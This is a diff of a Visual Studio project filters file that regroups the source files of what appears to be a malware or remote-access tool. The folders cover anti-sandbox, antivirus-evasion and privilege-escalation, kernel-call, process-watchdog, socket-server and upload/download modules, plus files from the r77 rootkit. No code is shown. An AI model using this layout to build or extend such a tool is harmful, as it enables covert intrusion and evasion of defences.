@@ -43,40 +43,76 @@
     <Filter Include="资源文件\hide System Porject">
       <UniqueIdentifier>{6dc04036-afd0-40a0-8c83-5129f22144dc}</UniqueIdentifier>
     </Filter>
+    <Filter Include="源文件\函数模块\加密">
+      <UniqueIdentifier>{8f42da04-8b5b-489c-843b-ff5e0bc13d27}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="源文件\函数模块\反沙箱">
+      <UniqueIdentifier>{6c98876f-be3f-4c7a-b841-fd8e87f6bc35}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="源文件\函数模块\免杀提权">
+      <UniqueIdentifier>{0282b52e-1763-4bbf-a0dd-076fc3d86e12}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="源文件\函数模块\连接/Socket套接字">
+      <UniqueIdentifier>{ae34400d-8e0f-4be2-9e4d-eac586d7d942}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="源文件\函数模块\文件操作">
+      <UniqueIdentifier>{aeaceb0b-fbfb-43d9-8958-0796a03055cd}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="源文件\函数模块\Other">
+      <UniqueIdentifier>{901b8834-015f-45bb-8200-66f64ac14154}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="源文件\函数模块\R3调R0函数">
+      <UniqueIdentifier>{1e1fc8b4-190c-4d78-b63b-1590359a1e42}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="源文件\函数模块\进程狗">
+      <UniqueIdentifier>{9ba10661-655b-48ae-bdfd-75c13a433f5e}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="源文件\函数模块\查询">
+      <UniqueIdentifier>{f1253306-930d-4caf-8ca3-052831216d88}</UniqueIdentifier>
+    </Filter>
   </ItemGroup>
   <ItemGroup>
-    <ClCompile Include="Anti sendbox.cpp">
-      <Filter>源文件\函数模块</Filter>
-    </ClCompile>
-    <ClCompile Include="Bypass.cpp">
-      <Filter>源文件\函数模块</Filter>
-    </ClCompile>
-    <ClCompile Include="Connect.cpp">
-      <Filter>源文件\函数模块</Filter>
-    </ClCompile>
-    <ClCompile Include="Encryption.cpp">
-      <Filter>源文件\函数模块</Filter>
-    </ClCompile>
-    <ClCompile Include="file_operation.cpp">
-      <Filter>源文件\函数模块</Filter>
-    </ClCompile>
-    <ClCompile Include="Funtions.cpp">
-      <Filter>源文件\函数模块</Filter>
-    </ClCompile>
     <ClCompile Include="control.cpp">
       <Filter>源文件\主模块</Filter>
-    </ClCompile>
-    <ClCompile Include="uoload_or_download-function.cpp">
-      <Filter>源文件\函数模块</Filter>
-    </ClCompile>
-    <ClCompile Include="kernel.cpp">
-      <Filter>源文件\函数模块</Filter>
     </ClCompile>
     <ClCompile Include="hand file\r77\r77 hand\Install.cpp">
       <Filter>源文件\函数模块\hide System Project</Filter>
     </ClCompile>
     <ClCompile Include="hand file\r77\r77 hand\r77api.cpp">
       <Filter>源文件\函数模块\hide System Project</Filter>
+    </ClCompile>
+    <ClCompile Include="Encryption.cpp">
+      <Filter>源文件\函数模块\加密</Filter>
+    </ClCompile>
+    <ClCompile Include="Anti sendbox.cpp">
+      <Filter>源文件\函数模块\反沙箱</Filter>
+    </ClCompile>
+    <ClCompile Include="Bypass.cpp">
+      <Filter>源文件\函数模块\免杀提权</Filter>
+    </ClCompile>
+    <ClCompile Include="Connect.cpp">
+      <Filter>源文件\函数模块\连接/Socket套接字</Filter>
+    </ClCompile>
+    <ClCompile Include="file_operation.cpp">
+      <Filter>源文件\函数模块\文件操作</Filter>
+    </ClCompile>
+    <ClCompile Include="Funtions.cpp">
+      <Filter>源文件\函数模块\Other</Filter>
+    </ClCompile>
+    <ClCompile Include="kernel.cpp">
+      <Filter>源文件\函数模块\R3调R0函数</Filter>
+    </ClCompile>
+    <ClCompile Include="Process Police.cpp">
+      <Filter>源文件\函数模块\进程狗</Filter>
+    </ClCompile>
+    <ClCompile Include="search_regedit_information.cpp">
+      <Filter>源文件\函数模块\查询</Filter>
+    </ClCompile>
+    <ClCompile Include="uoload_or_download-function.cpp">
+      <Filter>源文件\函数模块\Other</Filter>
+    </ClCompile>
+    <ClCompile Include="Socket_Tcp_Server.cpp">
+      <Filter>源文件\函数模块\连接/Socket套接字</Filter>
     </ClCompile>
   </ItemGroup>
   <ItemGroup>
